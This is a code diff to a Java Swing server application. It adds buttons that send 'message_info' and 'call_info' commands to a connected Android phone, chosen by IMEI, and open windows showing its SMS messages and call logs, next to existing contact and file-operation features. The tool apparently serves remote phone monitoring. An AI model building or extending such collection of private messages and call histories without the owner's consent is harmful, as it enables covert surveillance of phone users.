@@ -12,6 +12,7 @@ import java.awt.event.WindowAdapter;
 import java.awt.event.WindowEvent;
 import java.awt.event.WindowListener;
 import java.io.IOException;
+import java.text.MessageFormat;
 
 import javax.swing.DefaultCellEditor;
 import javax.swing.JButton;
@@ -33,7 +34,9 @@ import javax.swing.table.TableModel;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import com.saiteng.Frame.CallFrame;
 import com.saiteng.Frame.ContactFrame;
+import com.saiteng.Frame.MessageFrame;
 import com.saiteng.Frame.PhoneInfoFrame;
 import com.saiteng.connect.server.AndroidConnectClient;
 import com.saiteng.connect.server.AndroidConnectServer;
@@ -272,9 +275,10 @@ public class ConnectServerFrame extends JFrame implements ActionListener{
 		}else if(obj ==contactButton){
 			//通讯录窗体
 			if (IMEI != null) {
+				
 				connectServer.sendToClient(IMEI,"contact_info");
 				
-				ContactFrame contact = new ContactFrame();
+				ContactFrame contact = new ContactFrame(connectServer);
 				
 				Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
 				
@@ -286,6 +290,42 @@ public class ConnectServerFrame extends JFrame implements ActionListener{
 				JOptionPane.showMessageDialog(panel, "请勾选要查看的联系人", "标题",JOptionPane.WARNING_MESSAGE);
 			}
 			
+			
+		}else if(obj ==messageButton){
+			//短信窗体
+			if(IMEI != null){
+				
+				connectServer.sendToClient(IMEI,"message_info");
+				
+				MessageFrame messageframe = new MessageFrame(connectServer);
+				
+	            Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
+				
+	            messageframe.setBounds((screenSize.width) / 6, (screenSize.height) / 6, 1000, 600);
+
+	            messageframe.setVisible(true);
+				
+			}else{
+				JOptionPane.showMessageDialog(panel, "请勾选要查看的联系人", "标题",JOptionPane.WARNING_MESSAGE);
+			}
+			
+			
+		}else if(obj==phoneButton){
+			//通话记录
+			if(IMEI != null){
+				connectServer.sendToClient(IMEI,"call_info");
+				
+				CallFrame callframe = new CallFrame(connectServer);
+				
+	            Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
+				
+	            callframe.setBounds((screenSize.width) / 6, (screenSize.height) / 6, 800, 500);
+
+	            callframe.setVisible(true);
+				
+			}else{
+				JOptionPane.showMessageDialog(panel, "请勾选要查看的联系人", "标题",JOptionPane.WARNING_MESSAGE);
+			}
 			
 		} else if (obj == fileoperate) {
 			
